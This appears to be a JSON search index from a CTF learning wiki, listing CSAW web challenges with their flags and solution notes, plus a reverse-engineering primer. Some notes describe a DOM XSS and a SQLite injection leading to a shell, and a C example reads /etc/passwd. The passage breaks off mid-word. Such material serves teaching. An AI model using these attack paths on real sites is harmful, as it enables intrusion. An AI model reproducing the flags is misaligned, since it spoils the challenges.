            "text": "Not My Cup of Coffe\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nI heard you liked food based problems, so here's a liquid one.\n\n\nFlag\n\n\nflag{yd1dw3wr1t3th15j@v@is@n@landd0nt51@lize}\n\n\nSolution\n\n\nSee \nsolver/", 
            "title": "Not My Cup of Coffe"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/#not-my-cup-of-coffe", 
            "text": "", 
            "title": "Not My Cup of Coffe"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/#description", 
            "text": "I heard you liked food based problems, so here's a liquid one.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/#flag", 
            "text": "flag{yd1dw3wr1t3th15j@v@is@n@landd0nt51@lize}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/#solution", 
            "text": "See  solver/", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/", 
            "text": "wtf.sh (1)\n\n\nAuthor\n\n\nJosh Hofing\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\n$ man \n1\n wtf.sh\n\n\nWTF.SH(1)               Quals               WTF.SH(1)\n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You can get the flag to this first part of the\n       problem by getting  the  website  to  run  the\n       get_flag1  command. I heard the admin likes to\n       launch it when he visits his own profile.\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That  involve  childhood  trauma  of  too many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report  your  favorite  bugs  in   wtf.sh   at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh(2)\n\nCSAW 2016           September 2016          WTF.SH(1)\n\n\n\n\n\nFlag\n\n\nflag{l00k_at_m3_I_am_th3_4dm1n_n0w}\n\n\nSolution\n\n\nsolve1.sh\n\n\nwtf.sh(2)\n\n\nAuthor\n\n\nJosh Hofing\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\n$ man \n2\n wtf.sh\n\nWTF.SH\n(\n2\n)\n               Quals               WTF.SH\n(\n2\n)\n\n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You  can  get  the flag to this second part of\n       the problem by getting the website to run  the\n       get_flag2 command. Sadly, I can\nt seem to find\n       anything in the code that does that :\n(\n Do  you\n       think you could take a look at it \nfor\n me?\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That involve  childhood  trauma  of  too  many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report   your   favorite  bugs  in  wtf.sh  at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh\n(\n1\n)\n\n\nCSAW \n2016\n           September \n2016\n          WTF.SH\n(\n2\n)\n\n\n\n\n\n\nFlag\n\n\nflag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}\n\n\nSolution\n\n\nsolve2.sh", 
            "title": "WTF.sh (2)"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#wtfsh-1", 
            "text": "", 
            "title": "wtf.sh (1)"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#author", 
            "text": "Josh Hofing", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#description", 
            "text": "$ man  1  wtf.sh  WTF.SH(1)               Quals               WTF.SH(1)\n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You can get the flag to this first part of the\n       problem by getting  the  website  to  run  the\n       get_flag1  command. I heard the admin likes to\n       launch it when he visits his own profile.\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That  involve  childhood  trauma  of  too many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report  your  favorite  bugs  in   wtf.sh   at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh(2)\n\nCSAW 2016           September 2016          WTF.SH(1)", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#flag", 
            "text": "flag{l00k_at_m3_I_am_th3_4dm1n_n0w}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#solution", 
            "text": "solve1.sh", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#wtfsh2", 
            "text": "", 
            "title": "wtf.sh(2)"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#author_1", 
            "text": "Josh Hofing", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#points_1", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#category_1", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#description_1", 
            "text": "$ man  2  wtf.sh\n\nWTF.SH ( 2 )                Quals               WTF.SH ( 2 ) \n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You  can  get  the flag to this second part of\n       the problem by getting the website to run  the\n       get_flag2 command. Sadly, I can t seem to find\n       anything in the code that does that : (  Do  you\n       think you could take a look at it  for  me?\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That involve  childhood  trauma  of  too  many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report   your   favorite  bugs  in  wtf.sh  at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh ( 1 ) \n\nCSAW  2016            September  2016           WTF.SH ( 2 )", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#flag_1", 
            "text": "flag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#solution_1", 
            "text": "solve2.sh", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/", 
            "text": "Throwback\n\n\nAuthor\n\n\nPoints\n\n\n600\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nProgramming is hard. CTF software is hard too. We broke our CTF software a few years ago and looks like we did it again this year\n:( :( :(\nHINT: If you are smart about it, you do not need to attack the CTF infrastructure.\nHINT: The source code of our CTF software is on our Github. Also if you tried the challenge with flag{} before, try again.\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://blog.init-labs.org/2015/09/21/csaw-web-600-write-up/\n\n\nhttps://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/throwback\n\n\nhttp://blog.isis.poly.edu/2015/09/21/csaw-ctf-throwback.html", 
            "title": "Throwback"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/#throwback", 
            "text": "", 
            "title": "Throwback"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/#points", 
            "text": "600", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/#description", 
            "text": "Programming is hard. CTF software is hard too. We broke our CTF software a few years ago and looks like we did it again this year\n:( :( :(\nHINT: If you are smart about it, you do not need to attack the CTF infrastructure.\nHINT: The source code of our CTF software is on our Github. Also if you tried the challenge with flag{} before, try again.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/web/throwback-600/#solution", 
            "text": "http://blog.init-labs.org/2015/09/21/csaw-web-600-write-up/  https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/throwback  http://blog.isis.poly.edu/2015/09/21/csaw-ctf-throwback.html", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/", 
            "text": "Weeb Date\n\n\nAuthor\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nSince the Ashley Madison hack, a lot of high profile socialites have scrambled to find the hottest new dating sites. Unfortunately for us, that means they're taking more safety measures and only using secure websites. We have some suspicions that Donald Trump is using a new dating site called \"weebdate\" and also selling cocaine to fund his presidential campaign. We need you to get both his password and his 2 factor TOTP key so we can break into his profile and investigate.\nFlag is md5($totpkey.$password)\n\nhttp://54.175.160.194/\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://l.avala.mp/blog/csaw-2015-web-500-writeup/\n\n\nhttp://buer.haus/2015/09/20/csaw-2015-web-500-weebdate-writeup/\n\n\nhttp://w00tsec.blogspot.com/2015/09/csaw-2015-write-up-weebdate-web500.html\n\n\nhttp://blog.init-labs.org/2015/09/21/csaw-web-500-write-up/\n\n\nhttps://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/weebdate\n\n\nhttps://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/web_500_weebdate\n\n\nhttp://blog.isis.poly.edu/2015/10/03/csaw-ctf-weebdate.html", 
            "title": "Weebdate"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/#weeb-date", 
            "text": "", 
            "title": "Weeb Date"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/#description", 
            "text": "Since the Ashley Madison hack, a lot of high profile socialites have scrambled to find the hottest new dating sites. Unfortunately for us, that means they're taking more safety measures and only using secure websites. We have some suspicions that Donald Trump is using a new dating site called \"weebdate\" and also selling cocaine to fund his presidential campaign. We need you to get both his password and his 2 factor TOTP key so we can break into his profile and investigate.\nFlag is md5($totpkey.$password) http://54.175.160.194/", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/web/weebdate-500/#solution", 
            "text": "http://l.avala.mp/blog/csaw-2015-web-500-writeup/  http://buer.haus/2015/09/20/csaw-2015-web-500-weebdate-writeup/  http://w00tsec.blogspot.com/2015/09/csaw-2015-write-up-weebdate-web500.html  http://blog.init-labs.org/2015/09/21/csaw-web-500-write-up/  https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/weebdate  https://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/web_500_weebdate  http://blog.isis.poly.edu/2015/10/03/csaw-ctf-weebdate.html", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/", 
            "text": "TBBPE\n\n\nAuthor\n\n\nToews\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nThis is The Best Blogging Platform Ever...\nonly the most exclusive members are ever invited. We need you to break into the site and cast a vote for your team.\n\nhttps://csaw2015-the-blog.herokuapp.com/\n\nHINT: There are two separate bugs required to solve this challenge.\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/mastahyeti/the-blog/blob/master/solution.md\n\n\n\n\nSetup", 
            "title": "TBBPE"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#tbbpe", 
            "text": "", 
            "title": "TBBPE"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#author", 
            "text": "Toews", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#description", 
            "text": "This is The Best Blogging Platform Ever...\nonly the most exclusive members are ever invited. We need you to break into the site and cast a vote for your team. https://csaw2015-the-blog.herokuapp.com/ \nHINT: There are two separate bugs required to solve this challenge.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#solution", 
            "text": "https://github.com/mastahyeti/the-blog/blob/master/solution.md", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/tbbpe/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/web/animewall/", 
            "text": "animewall\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nWTF dad installed this firewall and now i cant visit my favorite anime websites.\ncan you unload the module for me?\ni believe in you, and more importantly, i believe in the you that believes in you....\nif i cant see animes i guess im gonna just blizz it...\nlain@54.85.189.105\npassword is lain\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
            "title": "Anime Wall"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#animewall", 
            "text": "", 
            "title": "animewall"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#description", 
            "text": "WTF dad installed this firewall and now i cant visit my favorite anime websites.\ncan you unload the module for me?\ni believe in you, and more importantly, i believe in the you that believes in you....\nif i cant see animes i guess im gonna just blizz it...\nlain@54.85.189.105\npassword is lain", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/animewall/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/", 
            "text": "Guestbook\n\n\nAuthor\n\n\nToews\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhttps://csaw-guestbook.herokuapp.com/\n\n\nFlag\n\n\nflag{octocat-d08b319374e5}\n\n\nSolution\n\n\nThis is a DOM XSS vulnerability in a guestbook application. There is a PhantomJS script that is logged in as the admin user and visits the page once per minute to approve/deny posts. The approve/deny functionality is done over XHR. To build the URL for the XHR request, JavaScript in the page pulls a URL out of an element in the page. The response from the XHR request (success/failure) is then injected into the page.\nThe attacker is able to post messages to the guestbook formatted using markdown. This is then converted to HTML after being run through some HTML sanitization. The HTML sanitization allows the user to set a class attribute on HTML tags. This can be used to trick the approve/deny JavaScript into making the XHR request to an attacker controlled page. The attacker can have this page return arbitrary HTML/JS, leading to XSS.\nWith this XSS, the attacker needs to execute JavaScript to make the admin user post a message with their name in it.\nI don't know how hard of challenges you guys are going for, but I could scale this a bit either way.\nI could also change the application to give a code to the user once they solve the challenge. Would that need to be a unique code per user, or just a single code.\nLet me know if I can clarify anything.\n\n\nSetup", 
            "title": "Guestbook"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#guestbook", 
            "text": "", 
            "title": "Guestbook"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#author", 
            "text": "Toews", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#description", 
            "text": "https://csaw-guestbook.herokuapp.com/", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#flag", 
            "text": "flag{octocat-d08b319374e5}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#solution", 
            "text": "This is a DOM XSS vulnerability in a guestbook application. There is a PhantomJS script that is logged in as the admin user and visits the page once per minute to approve/deny posts. The approve/deny functionality is done over XHR. To build the URL for the XHR request, JavaScript in the page pulls a URL out of an element in the page. The response from the XHR request (success/failure) is then injected into the page.\nThe attacker is able to post messages to the guestbook formatted using markdown. This is then converted to HTML after being run through some HTML sanitization. The HTML sanitization allows the user to set a class attribute on HTML tags. This can be used to trick the approve/deny JavaScript into making the XHR request to an attacker controlled page. The attacker can have this page return arbitrary HTML/JS, leading to XSS.\nWith this XSS, the attacker needs to execute JavaScript to make the admin user post a message with their name in it.\nI don't know how hard of challenges you guys are going for, but I could scale this a bit either way.\nI could also change the application to give a code to the user once they solve the challenge. Would that need to be a unique code per user, or just a single code.\nLet me know if I can clarify anything.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/web/guestbook_-_Toews/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/web/hashes/", 
            "text": "Hashes\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nlocation, location, location\n\n\nFlag\n\n\nflag{these_browser_bots_are_annoying}\n\n\nSolution\n\n\nSetup", 
            "title": "Hashes"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#hashes", 
            "text": "", 
            "title": "Hashes"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#author", 
            "text": "Chung", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#description", 
            "text": "location, location, location", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#flag", 
            "text": "flag{these_browser_bots_are_annoying}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/web/hashes/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/", 
            "text": "Webroot\n\n\nAuthor\n\n\nFreeman\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhackerhaikus.com\n\n\nFlag\n\n\nflag{rise_and_shine,_mr._freeman._rise_and_shine}\n\n\nSolution\n\n\n\n\nThere are two SQL injection vulnerabilities in the \"saveHaiku\" call; one in the timestamp and one in the encrypted haiku. First one requires changing the AMF type from number to string (no tools available, requires hex munging), second requires enumerating the DES_ECB key and encrypting a payload that way.\n\n\nBackend DB is SQLite3. Shell will probably be gained with the \"ATTACH DATABASE\" method outlined here: \nhttp://atta.cked.me/home/sqlite3injectioncheatsheet\n\n\nThere might also be bugs in Amfphp itself. In fact there almost certainly are. I haven't had time to test for these.\n\n\n\n\nSetup\n\n\nPlease find attached webroot.tgz. Some notes on setup:\n* Needs mcrypt and sqlite3 PHP extensions enabled\n* Apache should be configured with hackerhaikus.com as the virtual host (DNS is already pointing to the IP specified on IRC yesterday)\n* test2.php is meant to be there, it discloses the webroot which is needed for exploitation.\n\n\nNotes\n\n\n\n\nProbably just dump a file readable by www-data in /opt or something.\n\n\nI have no idea how points work for this, and how this ranks in complexity compared to the other challenges, and therefore have no idea how many points to assign for the challenge ;)", 
            "title": "Webroot"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#webroot", 
            "text": "", 
            "title": "Webroot"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#author", 
            "text": "Freeman", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#description", 
            "text": "hackerhaikus.com", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#flag", 
            "text": "flag{rise_and_shine,_mr._freeman._rise_and_shine}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#solution", 
            "text": "There are two SQL injection vulnerabilities in the \"saveHaiku\" call; one in the timestamp and one in the encrypted haiku. First one requires changing the AMF type from number to string (no tools available, requires hex munging), second requires enumerating the DES_ECB key and encrypting a payload that way.  Backend DB is SQLite3. Shell will probably be gained with the \"ATTACH DATABASE\" method outlined here:  http://atta.cked.me/home/sqlite3injectioncheatsheet  There might also be bugs in Amfphp itself. In fact there almost certainly are. I haven't had time to test for these.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#setup", 
            "text": "Please find attached webroot.tgz. Some notes on setup:\n* Needs mcrypt and sqlite3 PHP extensions enabled\n* Apache should be configured with hackerhaikus.com as the virtual host (DNS is already pointing to the IP specified on IRC yesterday)\n* test2.php is meant to be there, it discloses the webroot which is needed for exploitation.", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/web/webroot_-_Freeman/#notes", 
            "text": "Probably just dump a file readable by www-data in /opt or something.  I have no idea how points work for this, and how this ranks in complexity compared to the other challenges, and therefore have no idea how many points to assign for the challenge ;)", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/", 
            "text": "Silk Goat\n\n\nAuthor\n\n\nAhmed\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\n{{hacker manifesto}}\n\n\nFlag\n\n\nflag{silkroad4ever}\n\n\nSolution\n\n\nSetup", 
            "title": "Silkgoat"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#silk-goat", 
            "text": "", 
            "title": "Silk Goat"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#author", 
            "text": "Ahmed", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#description", 
            "text": "{{hacker manifesto}}", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#flag", 
            "text": "flag{silkroad4ever}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/web/silkgoat/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/reverse-engineering/introduction/", 
            "text": "Reverse Engineering\n\n\nReverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format.\n\n\nVery often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues.\n\n\n\n\nAssembly / Machine Code\n\n\nBytecode\n\n\nThe C Programming Language\n\n\nDisassemblers\n\n\nDecompilers", 
            "title": "Introduction"
        }, 
        {
            "location": "/reverse-engineering/introduction/#reverse-engineering", 
            "text": "Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format.  Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues.   Assembly / Machine Code  Bytecode  The C Programming Language  Disassemblers  Decompilers", 
            "title": "Reverse Engineering"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/", 
            "text": "Assembly/Machine Code\n\n\nMachine Code or Assembly is code which has been formatted for direct execution by a CPU. Machine Code is the why readable programming languages like C, when compiled, cannot be reversed into source code (well \nDecompilers\n can sort of, but more on that later). \n\n\nFrom Source to Compilation\n\n\nGodbolt\n shows the differences in machine code generated by various compilers.\n\n\nFor example, if we have a simple C++ function:\n\n\n#include\n \nunistd.h\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n\nint\n \nmain\n()\n \n{\n\n    \nchar\n \nc\n;\n\n    \nint\n \nfd\n \n=\n \nsyscall\n(\n2\n,\n \n/etc/passwd\n,\n \n0\n);\n\n    \nwhile\n \n(\nsyscall\n(\n0\n,\n \nfd\n,\n \nc\n,\n \n1\n))\n \n{\n\n        \nputchar\n(\nc\n);\n\n    \n}\n\n\n}\n\n\n\n\n\n\nWe can see the compilation results in some verbose instrucitons for the CPU:\n\n\n.LC0:\n\n  \n.string\n \n/etc/passwd\n\n\nmain:\n\n  \npush\n \nrbp\n\n  \nmov\n \nrbp\n,\n \nrsp\n\n  \nsub\n \nrsp\n,\n \n16\n\n  \nmov\n \nedx\n,\n \n0\n\n  \nmov\n \nesi\n,\n \nOFFSET\n \nFLAT\n:.\nLC0\n\n  \nmov\n \nedi\n,\n \n2\n\n  \nmov\n \neax\n,\n \n0\n\n  \ncall\n \nsyscall\n\n  \nmov\n \nDWORD\n \nPTR\n \n[\nrbp-4\n],\n \neax\n\n\n.L3:\n\n  \nlea\n \nrdx\n,\n \n[\nrbp-5\n]\n\n  \nmov\n \neax\n,\n \nDWORD\n \nPTR\n \n[\nrbp-4\n]\n\n  \nmov\n \necx\n,\n \n1\n\n  \nmov\n \nesi\n,\n \neax\n\n  \nmov\n \nedi\n,\n \n0\n\n  \nmov\n \neax\n,\n \n0\n\n  \ncall\n \nsyscall\n\n  \ntest\n \nrax\n,\n \nrax\n\n  \nsetne\n \nal\n\n  \ntest\n \nal\n,\n \nal\n\n  \nje\n \n.L2\n\n  \nmovzx\n \neax\n,\n \nBYTE\n \nPTR\n \n[\nrbp-5\n]\n\n  \nmovsx\n \neax\n,\n \nal\n\n  \nmov\n \nedi\n,\n \neax\n\n  \ncall\n \nputchar\n\n  \njmp\n \n.L3\n\n\n.L2:\n\n  \nmov\n \neax\n,\n \n0\n\n  \nleave\n\n  \nret\n\n\n\n\n\n\nThis is a one way process for compiled languages as there is no way to generate source from machine code. While the machine code may seem unintelligble, the extremely basic functions can be interpreted with some practice.\n\n\nx86-64\n\n\nx86-64 or amd64 or i64 is a 64-bit Complex Instruction Set Computing (CISC) architecture. This basically means that the registers used for this architecture extend an extra 32-bits on Intel's x86 architecture. CISC means that a single instruction can do a bunch of diferent things at once such as memory accesses, register reads, etc. It is also a variable-length instruction set which means diferent instructions can be diferent sizes ranging from 1 to 16 bytes long. And finally x86-64 allows for multi-sized register access which means that you can access certain parts of a register which are diferent sizes. \n\n\nx86-64 Registers\n\n\nx86-64 registers behave similarly to other architectures. A key component of x86-64 registers is multi-sized access which means the register RAX can have its lower 32 bits accessed with EAX. The next lower 16 bits can be accessed with AX and the lowest 8 bits can be accessed with AL which allows for the compuler to make optimizations which boost program execution. \n\n\n\nx86-64 has plenty of registers to use including rax, rbx, rcx, rdx, rdi, rsi, rsp, rip, r8-r15, and more! But some registers serve special purposes.\n\n\nThe special registers include:\n- RIP: the instruction pointer \n- RSP: the stack pointer \n- RBP: the base pointer\n\n\nInstructions\n\n\nAn \ninstruction\n represents a single operation for the CPU to perform.\n\n\nThere are diferent types of instructions including:\n\n\n\n\nData movement: \nmov rax, [rsp - 0x40]\n\n\nArithmetic: \nadd rbx, rcx\n\n\nControl-flow: \njne 0x8000400\n\n\n\n\nBecause x86-64 is a CISC architecture, instructions can be quite complex for machine code such as \nrepne scasb\n which repeats up to ECX times over memory at EDI looking for NULL byte (0x00), decrementing ECX each byte (Essentially strlen() in a single instruction!)\n\n\nIt is important to remember that an instruction really is just memory, this idea will become useful with Return Oriented Programming or ROP.\n\n\n\n\nNote\n\n\nInstructions, numbers, strings, everything! Always represented in hex.\n\n\n\n\nadd 